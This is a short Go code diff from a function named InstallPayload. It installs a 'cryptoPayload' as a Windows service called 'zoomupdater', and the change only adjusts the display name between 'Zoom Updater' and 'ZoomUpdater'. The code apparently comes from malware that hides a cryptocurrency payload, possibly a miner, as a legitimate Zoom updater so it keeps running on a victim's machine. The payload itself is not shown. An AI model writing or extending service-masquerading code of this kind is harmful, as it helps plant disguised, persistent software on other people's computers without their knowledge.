@@ -26,7 +26,7 @@ func InstallPayload(cryptoPayloadBytes []byte) error {
     if err != nil {
         return errors.Wrap(pkg, "failed to install payload", err)
     }
-    err = win.InstallService("zoomupdater", "Zoom Updater", cryptoPayload)
+    err = win.InstallService("zoomupdater", "ZoomUpdater", cryptoPayload)
     if err != nil {
         return errors.Wrap(pkg, "failed to install payload service", err)
     }
